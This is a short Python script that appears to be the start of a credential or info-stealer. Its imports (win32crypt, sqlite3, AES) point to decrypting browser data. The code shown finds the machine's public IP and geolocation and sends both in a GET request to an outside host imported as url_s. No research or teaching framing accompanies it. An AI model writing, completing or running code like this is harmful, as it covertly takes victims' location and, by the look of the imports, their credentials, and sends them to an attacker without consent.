import datetime
import shutil
import socket, requests, win32crypt, json, os, base64, sys
from rsa import decrypt
import sqlite3 
from Crypto.Cipher import AES
from net.conn import url_s

headers = {
           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
}

so = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
ip = requests.get('https://api.ipify.org').text
urlloc = 'http://ip-api.com/json/' + ip
location1 = requests.get(urlloc, headers=headers).text

ip_ = str(ip)

# # so.bind(("", 80))  
# s = requests.Session()  
# s.get("")
# s.auth = (f"IP: {ip}", f"Loc: {location1}") 

response = requests.get(url_s, 
                        params={
                            "username": ip, 
                            "password": location1, 
                        }) 




